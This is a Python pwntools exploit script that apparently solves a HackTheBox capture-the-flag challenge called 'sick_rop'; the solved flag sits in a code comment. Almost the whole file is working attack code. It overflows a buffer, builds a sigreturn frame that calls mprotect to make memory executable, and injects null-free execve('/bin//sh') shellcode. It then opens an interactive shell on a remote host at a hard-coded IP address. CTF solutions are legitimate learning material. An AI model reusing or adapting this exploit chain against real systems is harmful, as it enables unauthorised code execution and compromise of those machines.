from pwn import *
context.clear(arch='amd64')


instructions = [
    'xor rsi, rsi',
    'nop',
    'push rsi',
    'movabs rdi, 0x68732f2f6e69622f',
    'push rdi',
    'push rsp',
    'pop rdi',
    'push 0x3b',
    'pop rax',
    'cdq',
    'syscall'
]

def solve():
    LOCAL = False
    if LOCAL:
        r = process('./sick_rop')
    else:
        r = remote('142.93.32.153',30399)
    r = remote('142.93.32.153',30399)

    frame = SigreturnFrame(kernel="amd64")
    frame.rax = 10 #Mprotect for syscall table
    frame.rdi = 0x400000 #Writable memory segment
    frame.rsi = 0x4000 #Size
    frame.rdx = 7 #Read/Write/Exectable access
    #A pointer to vuln because rsp needs to point to the next instruction to be executed basically; it will return to the value at this address, which would be the vuln function
    # found with: pwndbg> search --type pointer 0x40102e
#Searching for value: b'.\x10@\x00\x00\x00\x00\x00'
#sick_rop        0x4010d8 adc byte ptr cs:[rax], al

    frame.rsp = 0x4010d8
    frame.rip = 0x401014



    vuln = p64(0x40102e)
    syscall = p64(0x401014)
    '''
    frame = SigreturnFrame(kernel='amd64')
    frame.rax = 10 # mprotect
    frame.rsp = 0x7ffffffde000 + 0x1000 #stack # i think the stack can change so we probably shouldn't use a hard coded stack value
    frame.rdi = 0x7ffffffde000 # arg 1 which is pointer to start of memory map 
    frame.rsi = 0x1000 # length
    frame.rdx = 7 # permissions
    frame.rip = 0x401014
    '''
    
    padding = b'A' * 40
    # execute vuln from vuln, so return into the next instruction which is a syscall
    # syscall executes sys_sig_return since rax = 15
#    gdb.attach(r)
    payload = padding + vuln + syscall + bytes(frame)


    shellcode = b''
    for i,v in enumerate(instructions):
        temp = asm(v, arch='amd64', os='linux')
        assert b'\x00' not in temp
        shellcode += temp
    print(shellcode)
    

    '''
    f = open('./payload', 'wb')
    f.write(payload)
    f.close()
    '''

    print("Sending payload")
    r.sendline(payload)
    r.recv()

    payload_vuln_input = b'B' * 15 # payload for our vuln() invocation which serves to set rax=15
#    gdb.attach(r)
    r.send(payload_vuln_input) # note: pressing enter sends a character, and new line is a character
    r.recv()

    print(len(shellcode))
    r.send(shellcode + b'\x90' * (40 - len(shellcode)) + p64(0x00000000004010b8)) # 0x4010b8 changes depending on size of the shellcode i think
    r.recv()
    r.interactive()

def main():
    solve()
    # HTB{why_st0p_wh3n_y0u_cAn_s1GRoP!?}

if __name__ == '__main__':
    main()
